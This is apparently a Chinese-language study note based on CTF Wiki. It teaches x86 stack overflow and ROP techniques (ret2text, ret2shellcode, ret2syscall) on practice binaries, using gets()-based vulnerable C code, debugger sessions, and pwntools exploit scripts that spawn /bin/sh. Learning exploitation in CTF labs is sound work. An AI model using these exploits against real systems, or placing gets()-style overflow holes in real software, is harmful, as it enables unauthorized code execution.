# 0.CTF-Wiki-ROP-
鸣谢Vancir,CTF Wiki.

01. Stack
 栈，FIFO，地址空间由高到低。  
 寄存器：ESP栈顶指针；EBP栈基指针。 
 ![image](https://user-images.githubusercontent.com/96966904/147868209-111ed65e-04a2-41fa-8af4-f2372b9e4cfe.png)  
 上图的EBP是caller，用于保存不需调用的临时数据；下面的EBP是callee，用于保存在调用中保留的值。  

02. Stack overflow(X86)  
 栈溢出，即向栈中变量写入的字，其字节数超出了该变量申请的字节数（例如：该变量总共申请2字节空间，非要往里面存32位int型数据）。  
 gets()函数不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易导致栈溢出（例如：莫里斯蠕虫）  
 //PIE和ASLR机制留待学习补充，本页不考虑其存在。   
 代码段：  
   #include <stdio.h>  
   #include <string.h>  
   void success() { puts("You Hava already controlled it."); }  
   void vulnerable() {  
     char s[12];  
     gets(s);  
     puts(s);  
     return;  
   }  
   int main(int argc, char **argv) {  
     vulnerable();  
     return 0;  
   }  
     
 编译：  
  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example   
  stack_example.c: In function ‘vulnerable’:  
  stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]  
     gets(s);  
     ^  
  /tmp/ccPU8rRA.o：在函数‘vulnerable’中：  
  stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.  
  注意警告！  
    
  常见的危险函数：  
  输入：gets(),scanf(),vscanf,  
  输出：sprintf()  
  字符串：strcpy(),strcat(),bcopy  
    
  确定填充长度：目的计算我们要操作的地址与我们要覆盖的地址的距离，通过覆盖地址实现对程序的直接或间接控制。  
  
 03.ROP  
  随着NX（即No-eXecute不可执行，基本原理是将数据所在内存页标识为不可执行）保护开启，直接注入代码的方式不可行了。  
  ROP(Return Oriented Programming)是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。  
    
  ROP攻击两个条件：1.程序存在溢出，并且可以控制返回地址；2.可以找到满足条件的 gadgets 以及相应 gadgets 的地址。  
    
  ret2text  
  即控制程序执行程序本身已有的的代码 (.text),或者是几段不相邻的程序的代码。  
  需要知道对应返回代码的位置，或者绕过系统保护找到对应代码的位置。  
  程序保护机制：  
    ret2text checksec ret2text  
    Arch:     i386-32-little  
    RELRO:    Partial RELRO  
    Stack:    No canary found  
    NX:       NX enabled  
    PIE:      No PIE (0x8048000)  
  易看出32位/仅开启NX机制。  
  源代码：  
    int __cdecl main(int argc, const char **argv, const char **envp){  
      int v4; // [sp+1Ch] [bp-64h]@1  
        
      setvbuf(stdout, 0, 2, 0);  
      setvbuf(_bss_start, 0, 1, 0);  
      puts("There is something amazing here, do you know anything?");  
      gets((char *)&v4);  
      printf("Maybe I will tell you next time !");  
      return 0;  
    }  
  程序地址及指令集：  
   .text:080485FD secure          proc near  
   .text:080485FD  
   .text:080485FD input           = dword ptr -10h  
   .text:080485FD secretcode      = dword ptr -0Ch  
   .text:080485FD  
   .text:080485FD                 push    ebp  
   .text:080485FE                 mov     ebp, esp  
   .text:08048600                 sub     esp, 28h  
   .text:08048603                 mov     dword ptr [esp], 0 ; timer  
   .text:0804860A                 call    _time  
   .text:0804860F                 mov     [esp], eax      ; seed  
   .text:08048612                 call    _srand  
   .text:08048617                 call    _rand  
   .text:0804861C                 mov     [ebp+secretcode], eax  
   .text:0804861F                 lea     eax, [ebp+input]  
   .text:08048622                 mov     [esp+4], eax  
   .text:08048626                 mov     dword ptr [esp], offset unk_8048760  
   .text:0804862D                 call    ___isoc99_scanf  
   .text:08048632                 mov     eax, [ebp+input]  
   .text:08048635                 cmp     eax, [ebp+secretcode]  
   .text:08048638                 jnz     short locret_8048646  
   .text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"  
   .text:08048641                 call    _system  
  看出调用了system（"/bin/sh"），我们要控制程序到0804863A，以得到系统shell。  
  然后构造payload，首先确定我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。  
   .text:080486A7                 lea     eax, [esp+1Ch]  
   .text:080486AB                 mov     [esp], eax      ; s  
   .text:080486AE                 call    _gets  
  找到mov esp，易看出是相对esp的索引，再进行调试，断点下到call处，查看esp，ebp。  
   gef➤  b *0x080486AE  
   Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.  
   gef➤  r  
   There is something amazing here, do you know anything?  
  
   Breakpoint 1, 0x080486ae in main () at ret2text.c:24  
   24      gets(buf);  
   ───────────────────────────────────────────────────────────────────────[ registers ]────  
   $eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"  
   $ebx   : 0x00000000  
   $ecx   : 0xffffffff  
   $edx   : 0xf7faf870  →  0x00000000  
   $esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"  
   $ebp   : 0xffffcdc8  →  0x00000000  
   $esi   : 0xf7fae000  →  0x001b1db0  
   $edi   : 0xf7fae000  →  0x001b1db0  
   $eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>  
  esp是ffffcd40，ebp是ffffcdc8，s相对于esp的索引是esp+1c，所以：  
  s 的地址为 0xffffcd5c，s 相对于 ebp 的偏移为 0x6c，s 相对于返回地址的偏移为 0x6c+4  
  最终得到payload：  
   ##!/usr/bin/env python  
   from pwn import *  
  
   sh = process('./ret2text')  
   target = 0x804863a  
   sh.sendline('A' * (0x6c+4) + p32(target))  
   sh.interactive()  
    
ret2shellcode  
 控制程序执行shellcide代码，用于获取目标系统的shell。  
 实现条件：对应的binary运行中，shellcode所在的区域可执行。  
 程序保护机制：  
    ret2shellcode checksec ret2shellcode  
    Arch:     i386-32-little  
    RELRO:    Partial RELRO  
    Stack:    No canary found  
    NX:       NX disabled  
    PIE:      No PIE (0x8048000)  
    RWX:      Has RWX segments  
 保护权限全关，且有RWX（读写执行）片段。  
 源程序：  
    int __cdecl main(int argc, const char **argv, const char **envp)  
   {  
     int v4; // [sp+1Ch] [bp-64h]@1  
  
     setvbuf(stdout, 0, 2, 0);  
     setvbuf(stdin, 0, 1, 0);  
     puts("No system for you this time !!!");  
     gets((char *)&v4);  
     strncpy(buf2, (const char *)&v4, 0x64u);  
     printf("bye bye ~");  
     return 0;  
   }  
 除了gets（）之外，还有strncpy（），用于将对应字符串复制到buf2处，也是高危栈溢出操作。  
 buf2的位置：  
   .bss:0804A080                 public buf2  
   .bss:0804A080 ; char buf2[100]  
 调试：  
   gef➤  b main  
   Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.  
   gef➤  r  
   Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode   
  
   Breakpoint 1, main () at ret2shellcode.c:8  
   8       setvbuf(stdout, 0LL, 2, 0LL);  
   ─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────  
         6  int main(void)  
         7  {  
    →    8      setvbuf(stdout, 0LL, 2, 0LL);  
         9      setvbuf(stdin, 0LL, 1, 0LL);  
        10    
   ─────────────────────────────────────────────────────────────────────[ trace ]────  
   [#0] 0x8048536 → Name: main()  
   ─────────────────────────────────────────────────────────────────────────────────────────────────────  
   gef➤  vmmap   
   Start      End        Offset     Perm Path  
   0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode  
   0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode  
   0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode  
   0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so  
   0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so  
   0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so  
   0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so  
   0xf7faf000 0xf7fb2000 0x00000000 rwx   
   0xf7fd3000 0xf7fd5000 0x00000000 rwx   
   0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]  
   0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]  
   0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so  
   0xf7ffb000 0xf7ffc000 0x00000000 rwx   
   0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so  
   0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so  
   0xfffdd000 0xffffe000 0x00000000 rwx [stack]  
 显然，0804a000-0804b000都rwx。  
 偏移计算同ret2text  
 payload：  
   #!/usr/bin/env python  
   from pwn import *  
  
   sh = process('./ret2shellcode')  
   shellcode = asm(shellcraft.sh())  
   buf2_addr = 0x804a080  
  
   sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))  
   sh.interactive()  
   
ret2syscall  
 控制程序执行系统调用，从而获取shell。  
 程序保护：  
    ret2syscall checksec rop  
    Arch:     i386-32-little  
    RELRO:    Partial RELRO  
    Stack:    No canary found  
    NX:       NX enabled  
    PIE:      No PIE (0x8048000)  
  显然，nx开着。  
  源程序：  
    int __cdecl main(int argc, const char **argv, const char **envp)  
   {  
     int v4; // [sp+1Ch] [bp-64h]@1  
  
     setvbuf(stdout, 0, 2, 0);  
     setvbuf(stdin, 0, 1, 0);  
     puts("This time, no system() and NO SHELLCODE!!!");  
     puts("What do you plan to do?");  
     gets(&v4);  
     return 0;  
   }  
  还是gets栈溢出，同上获得v4相对于ebp的偏移。  
  但这次无法运用程序中的代码、或者自己填写代码来获取shell，需要利用程序中的gadgets获得shell，相应的即是利用系统调用。  
     execve("/bin/sh",NULL,NULL)  
  使用ropgadgets工具寻找gadgets（具体方法被墙了，后续补充），找到一个有ebx、ecx、edx权限的gadgets   
     0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret  
  /bin/sh对应的地址：  
     ret2syscall ROPgadget --binary rop  --string '/bin/sh'   
     Strings information  
     ============================================================  
     0x080be408 : /bin/sh  
  int 0x80 的地址：  
       ret2syscall ROPgadget --binary rop  --only 'int'                   
       Gadgets information  
       ============================================================  
       0x08049421 : int 0x80  
       0x080938fe : int 0xbb  
       0x080869b5 : int 0xf6  
       0x0807b4d4 : int 0xfc  
  
       Unique gadgets found: 4  
  payload（ 0xb 是 execve）：  
    #!/usr/bin/env python  
    from pwn import *  
  
    sh = process('./rop')  
  
    pop_eax_ret = 0x080bb196  
    pop_edx_ecx_ebx_ret = 0x0806eb90  
    int_0x80 = 0x08049421  
    binsh = 0x80be408  
    payload = flat(  
        ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])  
    sh.sendline(payload)  
    sh.interactive()  
  
